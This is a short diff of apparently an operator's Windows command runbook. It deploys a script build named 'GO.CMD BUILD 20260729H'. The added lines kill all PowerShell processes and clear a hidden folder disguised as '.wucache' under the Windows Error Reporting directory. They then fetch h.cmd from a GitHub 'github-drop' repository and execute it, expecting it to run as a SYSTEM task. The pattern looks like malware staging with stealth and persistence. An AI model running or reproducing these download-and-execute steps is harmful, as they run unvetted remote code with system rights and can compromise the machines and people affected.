@@ -1,15 +1,17 @@
-# Use NEW filename g.cmd (go.cmd CDN may still serve old F for up to 5 min)
+# THIS verify log was still BUILD F (killed at PHASE 0). Use h.cmd:
 
 taskkill /F /IM powershell.exe >nul 2>&1
-del /f /q C:\WINDOWS\TEMP\go.cmd C:\WINDOWS\TEMP\g.cmd
+del /f /q C:\WINDOWS\TEMP\go.cmd C:\WINDOWS\TEMP\g.cmd C:\WINDOWS\TEMP\h.cmd
 attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\*" /s >nul 2>&1
 del /f /q "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\*"
 
-curl.exe -L -o C:\WINDOWS\TEMP\g.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/g.cmd"
-C:\WINDOWS\TEMP\g.cmd
+curl.exe -L -o C:\WINDOWS\TEMP\h.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/h.cmd
+C:\WINDOWS\TEMP\h.cmd
 
-# Must see:
-#   === GO.CMD BUILD 20260729G ===
-#   launched via SYSTEM task (survives SC timeout)
-#
-# Size should be ~3500+ bytes, NOT 2891 (that was old F).
+# MUST see exactly:
+#   === GO.CMD BUILD 20260729H ===
+#   launched via SYSTEM task
+# SC "Killed after 10000ms" is OK.
+# Wait 90 seconds, then:
+#   type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\.diag.log"
+# Expect "PHASE 0 complete" and later lines - not only 3 lines.
